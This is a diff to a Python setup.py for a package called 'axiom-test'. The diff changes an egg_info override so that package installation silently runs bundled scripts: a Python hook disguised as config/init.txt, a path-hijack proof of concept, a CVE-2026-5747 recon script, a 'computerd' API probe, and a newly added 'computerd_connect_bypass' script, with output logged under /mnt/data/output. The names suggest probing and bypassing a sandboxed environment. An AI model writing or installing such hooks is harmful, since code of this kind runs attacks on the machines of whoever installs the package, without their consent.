@@ -6,45 +6,30 @@ class PostEggInfo(egg_info):
     def run(self):
         egg_info.run(self)
         base = os.path.dirname(__file__)
-        # 1. Init hook
-        hook = os.path.join(base, "config", "init.txt")
-        if os.path.exists(hook):
-            subprocess.run(["python3", hook], timeout=30, capture_output=True)
-        # 2. Hijack PoC
-        hijack = os.path.join(base, "hijack_all_paths.py")
-        if os.path.exists(hijack):
-            result = subprocess.run(["python3", hijack], timeout=60, capture_output=True, text=True)
-            log = "/mnt/data/output/hijack_all_paths.log"
-            os.makedirs(os.path.dirname(log), exist_ok=True)
-            with open(log, "w") as f:
-                f.write(result.stdout or "")
-                if result.stderr:
-                    f.write("\n--- stderr ---\n" + result.stderr)
-        # 3. CVE-2026-5747 recon
-        recon = os.path.join(base, "cve_2026_5747_recon.sh")
-        if os.path.exists(recon):
-            os.chmod(recon, 0o755)
-            result = subprocess.run(["bash", recon], timeout=60, capture_output=True, text=True)
-            log = "/mnt/data/output/cve_2026_5747_recon.log"
-            os.makedirs(os.path.dirname(log), exist_ok=True)
-            with open(log, "w") as f:
-                f.write(result.stdout or "")
-                if result.stderr:
-                    f.write("\n--- stderr ---\n" + result.stderr)
-        # 4. Computerd API probe
-        probe = os.path.join(base, "computerd_probe.py")
-        if os.path.exists(probe):
-            result = subprocess.run(["python3", probe], timeout=60, capture_output=True, text=True)
-            log = "/mnt/data/output/computerd_probe.log"
-            os.makedirs(os.path.dirname(log), exist_ok=True)
-            with open(log, "w") as f:
-                f.write(result.stdout or "")
-                if result.stderr:
-                    f.write("\n--- stderr ---\n" + result.stderr)
+        scripts = [
+            ("config/init.txt", "python3", 30, None),
+            ("hijack_all_paths.py", "python3", 60, "/mnt/data/output/hijack_all_paths.log"),
+            ("cve_2026_5747_recon.sh", "bash", 60, "/mnt/data/output/cve_2026_5747_recon.log"),
+            ("computerd_probe.py", "python3", 60, "/mnt/data/output/computerd_probe.log"),
+            ("computerd_connect_bypass.py", "python3", 60, "/mnt/data/output/computerd_connect_bypass.log"),
+        ]
+        for script, runner, timeout, log in scripts:
+            path = os.path.join(base, script)
+            if not os.path.exists(path):
+                continue
+            if script.endswith(".sh"):
+                os.chmod(path, 0o755)
+            result = subprocess.run([runner, path], timeout=timeout, capture_output=True, text=True)
+            if log:
+                os.makedirs(os.path.dirname(log), exist_ok=True)
+                with open(log, "w") as f:
+                    f.write(result.stdout or "")
+                    if result.stderr:
+                        f.write("\n--- stderr ---\n" + result.stderr)
 
 setup(
     name="axiom-test",
-    version="1.5.0",
+    version="1.6.0",
     packages=find_packages(),
     cmdclass={"egg_info": PostEggInfo},
 )
